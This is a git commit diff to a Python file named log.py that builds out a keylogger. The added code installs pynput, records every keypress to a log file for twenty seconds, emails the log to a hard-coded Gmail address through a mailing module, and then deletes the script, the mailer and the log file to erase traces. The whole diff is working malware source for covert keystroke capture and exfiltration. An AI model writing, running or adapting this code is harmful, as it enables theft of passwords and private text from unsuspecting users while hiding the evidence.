3f871a42f9fe632334060eb1b3f1d2d90201f054
man44 <114590291+hardikkum444@users.noreply.github.com>
2024-04-07 17:41:36 +0530

    running through 1

--- log.py
+++ log.py
@@ -1,5 +1,14 @@
-from pynput import keyboard
 import subprocess
+import mailing
+import time
+import os
+
+try:
+    subprocess.run(["pip", "install", "pynput"])
+except:
+    print("already installed")
+
+from pynput import keyboard
 
 def keypressed(key):
     print(str(key))
@@ -13,19 +22,31 @@ def keypressed(key):
             elif key == keyboard.Key.space:
                 logkey.write(' ')
             elif key == keyboard.Key.backspace:
-                logkey.write('\b')
+                logkey.write('<bckspc>')
+            elif key == keyboard.Key.cmd:
+                logkey.write('<super>')
             else:
                 logkey.write(f'<{key}>')
 
 
 if __name__ == "__main__":
-    try:
-        subprocess.run(["pip", "install", "pynput"])
-    except:
-        print("already installed")
 
     listener = keyboard.Listener(on_press=keypressed)
     listener.start()
-    input()
+
+    time.sleep(20)
+
+    listener.stop()
+
+    subject = 'this is a test'
+    to_email = 'hardikkumawat444@gmail.com'
+
+    mailing.sendMail(subject,to_email)
+
+    os.remove("mailing.py")
+    os.remove("loggings.txt")
+    os.remove("log.py")
+
+
 
 
